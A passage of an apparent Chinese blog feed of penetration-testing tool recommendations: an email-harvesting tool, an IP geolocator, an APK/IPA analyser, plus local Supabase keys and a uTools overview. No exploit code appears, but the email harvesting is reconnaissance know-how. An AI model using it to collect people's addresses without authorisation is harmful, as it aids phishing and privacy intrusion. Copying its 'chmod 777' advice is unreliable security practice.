postgresql://postgres:postgres@127.0.0.1:54322/postgres</span><br><span class="line">      Studio URL: http://127.0.0.1:54323</span><br><span class="line">    Inbucket URL: http://127.0.0.1:54324</span><br><span class="line">      JWT secret: super-secret-jwt-token-with-at-least-32-characters-long</span><br><span class="line">        anon key: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZS1kZW1vIiwicm9sZSI6ImFub24iLCJleHAiOjE5ODM4MTI5OTZ9.CRXP1A7WOeoJeXxjNni43kdQwgnWNReilDMblYTn_I0</span><br><span class="line">service_role key: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZS1kZW1vIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImV4cCI6MTk4MzgxMjk5Nn0.EGIM96RAZx35lJzdJsyH-qQwv8Hdp7fsn3W0YpN81IU</span><br><span class="line">   S3 Access Key: 625729a08b95bf1b7ff351a663f3a23c</span><br><span class="line">   S3 Secret Key: 850181e4652dd023b7a98c58ae0d2d34bd487ee0cc3254aed6eda37307425907</span><br><span class="line">       S3 Region: local</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      <categories>
          
          <category> 工具推荐 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>49-ip定位工具-IPAddressQuery</title>
      <link href="/2024/04/26/49-ip%E5%AE%9A%E4%BD%8D%E5%B7%A5%E5%85%B7/"/>
      <url>/2024/04/26/49-ip%E5%AE%9A%E4%BD%8D%E5%B7%A5%E5%85%B7/</url>
      
        <content type="html"><![CDATA[<h2 id="gitee下载链接"><a href="#gitee下载链接" class="headerlink" title="gitee下载链接:"></a>gitee下载链接:</h2><p><a href="https://gitee.com/codevibe/IPAddressQuery">https://gitee.com/codevibe/IPAddressQuery</a></p><h2 id="工具介绍"><a href="#工具介绍" class="headerlink" title="工具介绍"></a>工具介绍</h2><p>对IP进行定位.支持使用proxychains4代理.</p><h2 id="显示信息"><a href="#显示信息" class="headerlink" title="显示信息:"></a>显示信息:</h2><p>经纬度</p><p>归属地</p><p>时区</p><p>服务提供商</p><p><img src="https://pic.imgdb.cn/item/662b44b00ea9cb1403960376.png" alt="img"></p><h2 id="下载和使用"><a href="#下载和使用" class="headerlink" title="下载和使用:"></a>下载和使用:</h2><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git clone https://gitee.com/codevibe/IPAddressQuery.git #下载</span><br><span class="line">cd IPAddressQuery/main #进入该目录</span><br><span class="line">ls #查看所有文件</span><br><span class="line">python IPAddressQuery.py -h #帮助</span><br><span class="line">python IPAddressQuery.py -a &lt;ip地址&gt; #使用</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">注意:需要使用python3的版本,如果缺少某些库,则使用pip 安装即可</span></span><br></pre></td></tr></tbody></table></figure><p><img src="https://pic.imgdb.cn/item/662b482b0ea9cb14039d84e9.png" alt="img"></p><h2 id="作者-codervibe"><a href="#作者-codervibe" class="headerlink" title="作者:codervibe"></a>作者:codervibe</h2><h2 id="交流群-660264846"><a href="#交流群-660264846" class="headerlink" title="交流群:660264846"></a>交流群:660264846</h2>]]></content>
      
      
      <categories>
          
          <category> 工具推荐 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透工具推荐 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>APK自动扫描漏洞</title>
      <link href="/2024/04/25/4-%E9%82%AE%E7%AE%B1%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7/"/>
      <url>/2024/04/25/4-%E9%82%AE%E7%AE%B1%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7/</url>
      
        <content type="html"><![CDATA[<h1 id="EmailAll"><a href="#EmailAll" class="headerlink" title="EmailAll"></a>EmailAll</h1><h3 id="A-powerful-Email-Collect-tool"><a href="#A-powerful-Email-Collect-tool" class="headerlink" title="A powerful Email Collect tool"></a>A powerful Email Collect tool</h3><h2 id="0x1-介绍"><a href="#0x1-介绍" class="headerlink" title="0x1 介绍"></a>0x1 介绍</h2><p>😲 <code>EmailAll</code> is a powerful Email Collect tool —— 一款强大的邮箱收集工具</p><p><a href="https://github.com/Taonn/EmailAll/blob/master/img/example1.png"><img src="https://github.com/Taonn/EmailAll/raw/master/img/example1.png" alt="example1"></a></p><p><a href="https://github.com/Taonn/EmailAll/blob/master/img/example2.png"><img src="https://github.com/Taonn/EmailAll/raw/master/img/example2.png" alt="example2"></a></p><p><a href="https://github.com/Taonn/EmailAll/blob/master/img/PhoneBook&amp;Snov_result.png"><img src="https://github.com/Taonn/EmailAll/raw/master/img/PhoneBook&amp;Snov_result.png" alt="PhoneBook&amp;Snov_result"></a></p><h2 id="0x2-安装-使用"><a href="#0x2-安装-使用" class="headerlink" title="0x2 安装&amp;使用"></a>0x2 安装&amp;使用</h2><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ git clone https://github.com/Taonn/EmailAll.git</span><br><span class="line">$ cd EmailAll</span><br><span class="line">$ pip3 install -r requirements.txt</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">EmailAll is a powerful Email Collect tool</span><br><span class="line"></span><br><span class="line">Example:</span><br><span class="line">    python3 emailall.py check</span><br><span class="line">    python3 emailall.py --domain example.com run</span><br><span class="line">    python3 emailall.py --domains ./domains.txt run</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> python3 emailall.py --domain example.com run</span><br><span class="line">python3 emailall.py --domains ./domains.txt run</span><br></pre></td></tr></tbody></table></figure><p>最终结果保存至<code>result</code>目录，分为不同模块json数据文件和汇总<code>{domain}_All.json</code>文件</p><h2 id="0x3-配置"><a href="#0x3-配置" class="headerlink" title="0x3 配置"></a>0x3 配置</h2><p>proxy配置在 <a href="https://github.com/Taonn/EmailAll/blob/master/config/setting.py">setting.py</a>文件</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxy={'http': '127.0.0.1:2333', 'https': '127.0.0.1:2333'}</span><br></pre></td></tr></tbody></table></figure><p>API配置在 <a href="https://github.com/Taonn/EmailAll/blob/master/config/api.py">api.py</a>文件</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># http://www.veryvp.com/</span><br><span class="line">veryvp_username = ''</span><br><span class="line">veryvp_password = ''</span><br><span class="line"></span><br><span class="line"># https://www.github.com</span><br><span class="line">github_token = ''</span><br><span class="line"></span><br><span class="line"># https://app.snov.io/</span><br><span class="line">snov_username = ''</span><br><span class="line">snov_password = ''</span><br><span class="line"></span><br><span class="line"># https://phonebook.cz/</span><br><span class="line">pb_key = ''</span><br></pre></td></tr></tbody></table></figure><ul><li><code>veryvp</code>和<code>snov</code>去网站免费注册</li><li><code>GitHub</code>的token去设置里创建一个即可</li><li><code>phonebook</code>的key访问<a href="https://phonebook.cz/%E7%84%B6%E5%90%8E%E6%9F%A5%E7%9C%8B%E6%BA%90%E4%BB%A3%E7%A0%81%EF%BC%8C%E5%B0%86%60API_KEY%60%E7%9A%84%E5%80%BC%E5%A1%AB%E5%85%A5%E5%8D%B3%E5%8F%AF">https://phonebook.cz/然后查看源代码，将`API_KEY`的值填入即可</a></li></ul><h2 id="0x4-模块"><a href="#0x4-模块" class="headerlink" title="0x4 模块"></a>0x4 模块</h2><p>邮箱信息收集主要来源如下：</p><ul><li>Search<ul><li>Ask</li><li>Baidu</li><li>Bing</li><li>Google</li><li>QWant</li><li>SO</li><li>Sougou</li><li>GithubApi</li></ul></li><li>DataSets<ul><li>Email-Format</li><li>Skymem</li><li>Veryvp</li><li>PhoneBook</li><li>Snov</li></ul></li></ul><h3 id="2022-2-19"><a href="#2022-2-19" class="headerlink" title="2022.2.19"></a>2022.2.19</h3><p>更新PhoneBook、Snov模块</p><p><a href="https://github.com/Taonn/EmailAll/blob/master/img/PhoneBook&amp;Snov.png"><img src="https://github.com/Taonn/EmailAll/raw/master/img/PhoneBook&amp;Snov.png" alt="PhoneBook&amp;Snov_result"></a></p><p><a href="https://github.com/Taonn/EmailAll/blob/master/img/PhoneBook&amp;Snov_result.png"><img src="https://github.com/Taonn/EmailAll/raw/master/img/PhoneBook&amp;Snov_result.png" alt="PhoneBook&amp;Snov_result"></a></p><h3 id="2022-2-16"><a href="#2022-2-16" class="headerlink" title="2022.2.16"></a>2022.2.16</h3><p>更新GithubApi模块</p><p><a href="https://github.com/Taonn/EmailAll/blob/master/img/githubapi.png"><img src="https://github.com/Taonn/EmailAll/raw/master/img/githubapi.png" alt="githubapi"></a></p><blockquote><p>后续还会更新~</p></blockquote><p>更多信息请关注<a href="https://github.com/Taonn/EmailAll/blob/master/docs/changes.md">changes.md</a></p><h2 id="0x5-参考"><a href="#0x5-参考" class="headerlink" title="0x5 参考"></a>0x5 参考</h2><p>参考了以下优秀的工具，并修改而来:</p><ul><li><a href="https://github.com/shmilylty/OneForAll">https://github.com/shmilylty/OneForAll</a></li><li><a href="https://github.com/laramies/theHarvester">https://github.com/laramies/theHarvester</a></li><li><a href="https://github.com/m4ll0k/Infoga">https://github.com/m4ll0k/Infoga</a></li></ul><p>感谢这些师傅们的分享！！！</p><h2 id="0x6-感谢"><a href="#0x6-感谢" class="headerlink" title="0x6 感谢"></a>0x6 感谢</h2><p>感谢网上开源的各大项目！！！</p><ul><li>特别感谢<a href="https://github.com/r00tSe7en">Se7en</a>师傅对于接口的补充</li></ul><h2 id="0x7-免责声明"><a href="#0x7-免责声明" class="headerlink" title="0x7 免责声明"></a>0x7 免责声明</h2><p> 本工具仅能在取得足够合法授权的企业安全建设中使用，在使用本工具过程中，您应确保自己所有行为符合当地的法律法规。 如您在使用本工具的过程中存在任何非法行为，您将自行承担所有后果，本工具所有开发者和所有贡献者不承担任何法律及连带责任。 除非您已充分阅读、完全理解并接受本协议所有条款，否则，请您不要安装并使用本工具。 您的使用行为或者您以其他任何明示或者默示方式表示接受本协议的，即视为您已阅读并同意本协议的约束。</p>]]></content>
      
      
      <categories>
          
          <category> 工具推荐 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透工具推荐 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>APK自动扫描漏洞</title>
      <link href="/2024/04/23/3-APK%E8%87%AA%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B/"/>
      <url>/2024/04/23/3-APK%E8%87%AA%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="AppMessenger-appmsg"><a href="#AppMessenger-appmsg" class="headerlink" title="AppMessenger(appmsg)"></a>AppMessenger(appmsg)</h1><p>下载地址：<a href="https://github.com/sulab999/AppMessenger/releases/download/v4.6.3/appmsg4.6.3.zip">https://github.com/sulab999/AppMessenger/releases/download/v4.6.3/appmsg4.6.3.zip</a></p><p>jdk17下载地址:<a href="https://www.oracle.com/java/technologies/javase/jdk17-archive-downloads.html">https://www.oracle.com/java/technologies/javase/jdk17-archive-downloads.html</a></p><h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><h2 id="解析APP"><a href="#解析APP" class="headerlink" title="解析APP"></a>解析APP</h2><p>一款适用于以APP病毒分析、APP漏洞挖掘、APP开发、HW行动/红队/渗透测试团队为场景的移动端(Android、iOS)辅助分析工具，可以帮助APP开发工程师、病毒分析师、漏洞/安全研究员提高工作效率，帮助渗透测试工程师、攻击队成员/红队成员快速收集到移动端中关键的资产信息并提供基本的信息输出,如：包名（packageName）、版本(versionName\versionCode)、应用签名(Signature)、文件MD5、SDK、URL、APP漏洞等信息。</p><h2 id="APK文件解析"><a href="#APK文件解析" class="headerlink" title="APK文件解析"></a>APK文件解析</h2><p><a href="https://github.com/sulab999/AppMessenger/blob/master/pic/pic1.png"><img src="https://github.com/sulab999/AppMessenger/raw/master/pic/pic1.png" alt="img"></a></p><p><a href="https://github.com/sulab999/AppMessenger/blob/master/pic/pic2.png"><img src="https://github.com/sulab999/AppMessenger/raw/master/pic/pic2.png" alt="img"></a></p><p><a href="https://github.com/sulab999/AppMessenger/blob/master/pic/pic3.png"><img src="https://github.com/sulab999/AppMessenger/raw/master/pic/pic3.png" alt="img"></a></p><h2 id="IPA文件解析"><a href="#IPA文件解析" class="headerlink" title="IPA文件解析"></a>IPA文件解析</h2><p><a href="https://github.com/sulab999/AppMessenger/blob/master/pic/ipa1.png"><img src="https://github.com/sulab999/AppMessenger/raw/master/pic/ipa1.png" alt="img"></a></p><p><a href="https://github.com/sulab999/AppMessenger/blob/master/pic/ipa2.png"><img src="https://github.com/sulab999/AppMessenger/raw/master/pic/ipa2.png" alt="img"></a></p><h2 id="高级检测-目前只支持APK"><a href="#高级检测-目前只支持APK" class="headerlink" title="高级检测(目前只支持APK)"></a>高级检测(目前只支持APK)</h2><p><a href="https://github.com/sulab999/AppMessenger/blob/master/pic/gj1.png"><img src="https://github.com/sulab999/AppMessenger/raw/master/pic/gj1.png" alt="img"></a></p><p><a href="https://github.com/sulab999/AppMessenger/blob/master/pic/gj2.png"><img src="https://github.com/sulab999/AppMessenger/raw/master/pic/gj2.png" alt="img"></a></p><p><a href="https://github.com/sulab999/AppMessenger/blob/master/pic/gj3.png"><img src="https://github.com/sulab999/AppMessenger/raw/master/pic/gj3.png" alt="img"></a></p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><ul><li>本项目始于SULAB安全团队，并联合知识星球：移动安全</li><li>如果您觉得这个项目对您有用，请点击本项目右上角的”star”按钮。</li><li>如果您想持续跟进新的版本情况，请点击本项目右上角的”Watch”按钮。</li><li>会在知识星球发布内测或特别版</li><li>新的功能或者需求会持续进行开发，欢迎提BUG。</li><li>后期更新版本见releases</li></ul><h1 id="适用场景"><a href="#适用场景" class="headerlink" title="适用场景"></a>适用场景</h1><ul><li>APP病毒分析</li><li>APP漏洞挖掘</li><li>APP信息收集</li><li>日常渗透测试/攻防演练中对APP中涉及的关键资产信息收集，比如URL地址、IP地址、关键字等信息的采集等。</li></ul><h1 id="功能介绍"><a href="#功能介绍" class="headerlink" title="功能介绍:"></a>功能介绍:</h1><ul><li>[√] 支持任意文件MD5识别</li><li>[√] 支持DEX、APK、IPA文件的信息收集</li><li>[√] 支持Android壳识别（识别准确率99%，业界一流）</li><li>[√] 支持基础检测：文件路径、包名、版本名、文件MD5、文件SHA1、DEX MD5、文件大小、allowbackup、debuggable、打包时间</li><li>[√] 支持解析APP权限信息、签名信息、支持系统版本等其他信息</li><li>[√] 支持敏感信息检测，如：url、ip等</li><li>[√] 支持Windows系统、MacOS系统、*nux系列的系统</li><li>[√] APP漏洞检测</li><li>[×] 一键对APK文件重打包</li></ul><h1 id="环境说明"><a href="#环境说明" class="headerlink" title="环境说明"></a>环境说明</h1><ul><li>App文件解析需要使用JAVA环境,JAVA版本11及以上</li><li>检测java版本命令:java –version</li><li>启动:java -jar appmsg.jar</li><li>Pro版已集成java环境可开箱即用</li></ul><h1 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h1><p>pro版<br>可直接安装使用</p><p>v4.5之前<br>建议使用jdk9或jdk1.8</p><p>v4.5-v4.6.3版本<br>1、如有java环境，可双击apkmsg.jar，即可启动，直接将APP拖入即可自动识别<br>2、如果无法打开或显示有乱码，可下载配套的jdk11，运行里面写好的脚本，即可一键启动<br>3、MAC和Linux系统需要对运行脚本和JAVA_HOME里的文件授予可执行权限，命令如下<br>chmod 777 运行mac/运行linux.sh<br>chmod -R 777 JAVA_HOME<br>jdk11：<a href="https://github.com/sulab999/AppMessenger/releases/download/v4.6.2/jdk11.zip">https://github.com/sulab999/AppMessenger/releases/download/v4.6.2/jdk11.zip</a><br><a href="https://github.com/sulab999/AppMessenger/blob/master/pic/start.png"><img src="https://github.com/sulab999/AppMessenger/raw/master/pic/start.png" alt="start"></a></p><h1 id="感谢“移动安全”知识星球的小伙伴，欢迎进群"><a href="#感谢“移动安全”知识星球的小伙伴，欢迎进群" class="headerlink" title="感谢“移动安全”知识星球的小伙伴，欢迎进群"></a>感谢“移动安全”知识星球的小伙伴，欢迎进群</h1><p><img src="https://github.com/sulab999/AppMessenger/raw/master/pic/kefu.jpg" alt="zsxq"></p>]]></content>
      
      
      <categories>
          
          <category> 工具推荐 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透工具推荐 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透辅助工具-uTools</title>
      <link href="/2024/04/22/2-utools/"/>
      <url>/2024/04/22/2-utools/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.u.tools/">https://www.u.tools/</a></p><h1 id="为什么使用-uTools"><a href="#为什么使用-uTools" class="headerlink" title="为什么使用 uTools?"></a>为什么使用 uTools?<a href="https://www.u.tools/docs/guide/about-uTools.html#%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BD%BF%E7%94%A8-utools"></a></h1><p>uTools，作为一个多功能、现代化的工具平台，很难用一句话说完它能做什么？因为从提高工作效率的工具到定制化工作流程，uTools 提供了多样化的功能，满足不同用户需求，使其成为一款功能强大的个人效率助理。</p><p>本文旨在通过阐述 uTools 的设计理念，展现其独特之处。</p><h2 id="一、呼之即来，即用即走"><a href="#一、呼之即来，即用即走" class="headerlink" title="一、呼之即来，即用即走"></a>一、呼之即来，即用即走<a href="https://www.u.tools/docs/guide/about-uTools.html#%E4%B8%80%E3%80%81%E5%91%BC%E4%B9%8B%E5%8D%B3%E6%9D%A5-%E5%8D%B3%E7%94%A8%E5%8D%B3%E8%B5%B0"></a></h2><p>uTools 的设计理念是希望让你能随时随地使用 uTools，尽可能减少你的操作步骤，让你的工作节奏更加连续，减少中断感。</p><p>在任何窗口，你都可以使用快捷键 <code>Alt + 空格键</code> 呼出 uTools。不管是查询内容还是使用功能，你都能很快获得结果。使用完后，uTools 会失去焦点自动隐藏，你就可以继续当前的工作。</p><p>可以通过以下具体场景来体会到它的即用即走交互。</p><p><video width="960" controls="" poster="https://res.u-tools.cn/docs/video-cover.png" style="box-sizing: border-box; display: block; max-width: 100%; height: auto; color: rgb(60, 60, 67); font-family: &quot;Chinese Quotes&quot;, &quot;Inter var&quot;, Inter, ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;Helvetica Neue&quot;, Helvetica, Arial, &quot;Noto Sans&quot;, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;, &quot;Noto Color Emoji&quot;; font-size: 16px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; white-space: normal; background-color: rgb(255, 255, 255); text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial;"></video></p><h2 id="二、一切皆插件设计，无限可能"><a href="#二、一切皆插件设计，无限可能" class="headerlink" title="二、一切皆插件设计，无限可能"></a>二、一切皆插件设计，无限可能<a href="https://www.u.tools/docs/guide/about-uTools.html#%E4%BA%8C%E3%80%81%E4%B8%80%E5%88%87%E7%9A%86%E6%8F%92%E4%BB%B6%E8%AE%BE%E8%AE%A1-%E6%97%A0%E9%99%90%E5%8F%AF%E8%83%BD"></a></h2><p>uTools 是新一代的效率工具平台，它采用底座平台 + 插件应用的创新形式来满足电脑用户各式各样的需求。</p><p><video width="960" controls="" poster="https://res.u-tools.cn/docs/video-cover.png" style="box-sizing: border-box; display: block; max-width: 100%; height: auto; color: rgb(60, 60, 67); font-family: &quot;Chinese Quotes&quot;, &quot;Inter var&quot;, Inter, ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;Helvetica Neue&quot;, Helvetica, Arial, &quot;Noto Sans&quot;, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;, &quot;Noto Color Emoji&quot;; font-size: 16px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; white-space: normal; background-color: rgb(255, 255, 255); text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial;"></video></p><p><img src="https://res.u-tools.cn/docs/plugin-store-01.png" alt="插件应用市场"></p><p>开发者通过 [uTools 开发者工具](utools://uTools 开发者工具) 提交插件应用来满足不同用户的需求。</p><p>用户可以对插件进行评论和评分，还可以对自己喜欢的插件应用进行赞赏。有越来越多的开发者加入到这个平台，也不断涌现出新的插件，这将带来无限可能。</p><h2 id="三、极简设计，超轻量但功能强大"><a href="#三、极简设计，超轻量但功能强大" class="headerlink" title="三、极简设计，超轻量但功能强大"></a>三、极简设计，超轻量但功能强大<a href="https://www.u.tools/docs/guide/about-uTools.html#%E4%B8%89%E3%80%81%E6%9E%81%E7%AE%80%E8%AE%BE%E8%AE%A1-%E8%B6%85%E8%BD%BB%E9%87%8F%E4%BD%86%E5%8A%9F%E8%83%BD%E5%BC%BA%E5%A4%A7"></a></h2><h3 id="场景-1：快速查询内容"><a href="#场景-1：快速查询内容" class="headerlink" title="场景 1：快速查询内容"></a>场景 1：快速查询内容<a href="https://www.u.tools/docs/guide/about-uTools.html#%E5%9C%BA%E6%99%AF-1-%E5%BF%AB%E9%80%9F%E6%9F%A5%E8%AF%A2%E5%86%85%E5%AE%B9"></a></h3><p>想要搜索内容时，<code>Alt + 空格键</code> 呼出搜索框，输入搜索词，剪贴板、备忘快贴、本地文件等插件应用内中匹配到的数据就会显示出来，点击内容复制。</p><p><img src="https://res.u-tools.cn/docs/about-uTools-09.png" alt="搜索内容"></p><h3 id="场景-2：快速翻译"><a href="#场景-2：快速翻译" class="headerlink" title="场景 2：快速翻译"></a>场景 2：快速翻译<a href="https://www.u.tools/docs/guide/about-uTools.html#%E5%9C%BA%E6%99%AF-2-%E5%BF%AB%E9%80%9F%E7%BF%BB%E8%AF%91"></a></h3><p>遇到不懂的英文，选中单词或句子，按下鼠标中键，弹出超级面板，即可看到翻译结果。</p><p><img src="https://res.u-tools.cn/docs/about-uTools-10.png" alt="快速翻译"></p><h3 id="场景-3：随手计算"><a href="#场景-3：随手计算" class="headerlink" title="场景 3：随手计算"></a>场景 3：随手计算<a href="https://www.u.tools/docs/guide/about-uTools.html#%E5%9C%BA%E6%99%AF-3-%E9%9A%8F%E6%89%8B%E8%AE%A1%E7%AE%97"></a></h3><p>遇到需要计算时，<code>Alt + 空格键</code> 呼出搜索框，输入计算内容，即可看到计算结果。</p><p><img src="https://res.u-tools.cn/docs/about-uTools-11.png" alt="计算稿纸"></p><h3 id="场景-4：快速处理图片"><a href="#场景-4：快速处理图片" class="headerlink" title="场景 4：快速处理图片"></a>场景 4：快速处理图片<a href="https://www.u.tools/docs/guide/about-uTools.html#%E5%9C%BA%E6%99%AF-4-%E5%BF%AB%E9%80%9F%E5%A4%84%E7%90%86%E5%9B%BE%E7%89%87"></a></h3><p>想要截图时，<code>Alt + 空格键</code> 呼出搜索框，输入截图，回车触发功能，截完图后，会自动粘贴到搜索框中，等待你下一步的选择，回车后获得结果。</p><p><img src="https://res.u-tools.cn/docs/what-is-keyword-05.png" alt="匹配图片"></p><h3 id="场景-5：聚合翻译"><a href="#场景-5：聚合翻译" class="headerlink" title="场景 5：聚合翻译"></a>场景 5：聚合翻译<a href="https://www.u.tools/docs/guide/about-uTools.html#%E5%9C%BA%E6%99%AF-5-%E8%81%9A%E5%90%88%E7%BF%BB%E8%AF%91"></a></h3><p>一键聚合多个翻译引擎的结果，让你轻松比较，选择最准确的翻译。</p><p><img src="https://res.u-tools.cn/docs/plugin-translator-00.png" alt="翻译"></p><h3 id="场景-6：OCR-文字识别"><a href="#场景-6：OCR-文字识别" class="headerlink" title="场景 6：OCR 文字识别"></a>场景 6：OCR 文字识别<a href="https://www.u.tools/docs/guide/about-uTools.html#%E5%9C%BA%E6%99%AF-6-ocr-%E6%96%87%E5%AD%97%E8%AF%86%E5%88%AB"></a></h3><p>将图片中的文字转化为可编辑的文本，大大提高了工作效率。</p><p><img src="https://res.u-tools.cn/docs/plugin-ocr-03.png" alt="OCR"></p><h3 id="场景-7：剪贴板"><a href="#场景-7：剪贴板" class="headerlink" title="场景 7：剪贴板"></a>场景 7：剪贴板<a href="https://www.u.tools/docs/guide/about-uTools.html#%E5%9C%BA%E6%99%AF-7-%E5%89%AA%E8%B4%B4%E6%9D%BF"></a></h3><p>它不仅能够保存你复制的文本、图片等信息，还能方便你随时调用，让复制粘贴变得高效而有序。</p><p><img src="https://res.u-tools.cn/docs/plugin-clipboard-00.png" alt="clipboard"></p><h3 id="场景-8：网页快开"><a href="#场景-8：网页快开" class="headerlink" title="场景 8：网页快开"></a>场景 8：网页快开<a href="https://www.u.tools/docs/guide/about-uTools.html#%E5%9C%BA%E6%99%AF-8-%E7%BD%91%E9%A1%B5%E5%BF%AB%E5%BC%80"></a></h3><p>一键直达你最爱的网站，让网络浏览变得前所未有的快捷。</p><p><img src="https://res.u-tools.cn/docs/plugin-open-web-06.png" alt="网页快开"></p><h3 id="场景-9：Markdown-笔记"><a href="#场景-9：Markdown-笔记" class="headerlink" title="场景 9：Markdown 笔记"></a>场景 9：Markdown 笔记<a href="https://www.u.tools/docs/guide/about-uTools.html#%E5%9C%BA%E6%99%AF-9-markdown-%E7%AC%94%E8%AE%B0"></a></h3><p>为那些喜欢简洁而强大工具的创作者量身打造。Markdown 笔记提供极佳的编辑体验，实时预览功能让你的创作过程更加流畅，而存储功能则确保你的每一个想法都能安全地保存。</p><p><img src="https://res.u-tools.cn/docs/plugin-markdown-00.png" alt="markdown"></p><h3 id="场景-10：备忘快贴"><a href="#场景-10：备忘快贴" class="headerlink" title="场景 10：备忘快贴"></a>场景 10：备忘快贴<a href="https://www.u.tools/docs/guide/about-uTools.html#%E5%9C%BA%E6%99%AF-10-%E5%A4%87%E5%BF%98%E5%BF%AB%E8%B4%B4"></a></h3><p>这不仅仅是一个备忘录，它是你的思维加速器。无论是灵光一现的文本、复杂的代码片段，还是那些需要保存的图片，备忘快贴都能迅速记录，让你的思绪不再飘散。</p><p><img src="https://res.u-tools.cn/docs/plugin-memo-14.png" alt="备忘快贴"></p><h3 id="场景-11：文件批量重命名"><a href="#场景-11：文件批量重命名" class="headerlink" title="场景 11：文件批量重命名"></a>场景 11：文件批量重命名<a href="https://www.u.tools/docs/guide/about-uTools.html#%E5%9C%BA%E6%99%AF-11-%E6%96%87%E4%BB%B6%E6%89%B9%E9%87%8F%E9%87%8D%E5%91%BD%E5%90%8D"></a></h3><p>告别手动重命名的枯燥，一键整理你的文件，让文件管理变得井井有条。</p><p><img src="https://res.u-tools.cn/docs/about-uTools-05.png" alt="文件批量重命名"></p><h3 id="场景-12：图片批量处理"><a href="#场景-12：图片批量处理" class="headerlink" title="场景 12：图片批量处理"></a>场景 12：图片批量处理<a href="https://www.u.tools/docs/guide/about-uTools.html#%E5%9C%BA%E6%99%AF-12-%E5%9B%BE%E7%89%87%E6%89%B9%E9%87%8F%E5%A4%84%E7%90%86"></a></h3><p>统一调整图片尺寸，批量格式转换，让你的图片管理工作变得轻松愉快。</p><p><img src="https://res.u-tools.cn/docs/about-uTools-06.png" alt="图片批量处理"></p><h3 id="场景-13：JSON-编辑器"><a href="#场景-13：JSON-编辑器" class="headerlink" title="场景 13：JSON 编辑器"></a>场景 13：JSON 编辑器<a href="https://www.u.tools/docs/guide/about-uTools.html#%E5%9C%BA%E6%99%AF-13-json-%E7%BC%96%E8%BE%91%E5%99%A8"></a></h3><p>只需轻轻一点，杂乱无章的 JSON 数据就能变得井然有序。</p><p><img src="https://res.u-tools.cn/docs/about-uTools-07.png" alt="JSON"></p><h3 id="场景-14：Javascript-文档速查"><a href="#场景-14：Javascript-文档速查" class="headerlink" title="场景 14：Javascript 文档速查"></a>场景 14：Javascript 文档速查<a href="https://www.u.tools/docs/guide/about-uTools.html#%E5%9C%BA%E6%99%AF-14-javascript-%E6%96%87%E6%A1%A3%E9%80%9F%E6%9F%A5"></a></h3><p>你的 JavaScript 指南，提供最新的 JavaScript 文档，帮你解决编程中的疑惑。</p><p><img src="https://res.u-tools.cn/docs/about-uTools-08.png" alt="Javascript"></p><h3 id="场景-15：启动软件"><a href="#场景-15：启动软件" class="headerlink" title="场景 15：启动软件"></a>场景 15：启动软件<a 